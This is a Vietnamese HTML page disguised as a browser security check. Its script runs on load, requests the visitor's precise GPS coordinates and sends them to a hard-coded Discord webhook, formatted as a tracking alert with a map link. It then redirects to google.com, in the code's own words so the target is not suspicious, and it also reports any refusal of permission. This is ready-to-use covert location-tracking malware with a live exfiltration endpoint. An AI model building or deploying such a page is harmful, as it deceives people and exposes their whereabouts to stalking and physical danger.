<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Đang kiểm tra trình duyệt...</title>
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    </style>
</head>
<body>
    <div>
        <h2>Đang xác thực bảo mật, vui lòng đợi...</h2>
    </div>

    <script>
        // THAY URL WEBHOOK DISCORD CỦA BẠN VÀO ĐÊY
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1496167020134400233/N8Gig2Z927oHFS70iXnG5jdTAl4RbEGHf2tAxAE9i4Rn6txwDmjW9jWkzl5J_pzDqDs6";

        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            const payload = {
                "embeds": [{
                    "title": "🎯 VỊ TRÍ GPS CHÍNH XÁC TUYỆT ĐỐI",
                    "color": 15548997,
                    "fields": [
                        {"name": "📍 Tọa độ", "value": `\`${lat}, ${lon}\``, "inline": true},
                        {"name": "📏 Độ sai số", "value": `\`${acc.toFixed(1)} mét\``, "inline": true},
                        {"name": "🗺 Google Maps", "value": `[Bấm để xem vị trí](https://www.google.com/maps?q=${lat},${lon})`}
                    ],
                    "footer": {"text": "Hệ thống T-Math GPS Tracker"}
                }]
            };

            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                // Sau khi gửi xong, chuyển hướng họ sang trang khác để không nghi ngờ
                window.location.href = "https://google.com";
            });
        }

        function handleError(error) {
            // Nếu họ từ chối, bạn có thể gửi thông báo về Discord là họ đã chặn quyền
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({"content": "❌ Đối tượng đã mở link nhưng **Từ chối** cấp quyền truy cập GPS."})
            });
        }

        window.onload = function() {
            if (navigator.geolocation) {
                // Yêu cầu tọa độ với độ chính xác cao nhất (High Accuracy)
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            }
        };
    </script>
</body>
</html>
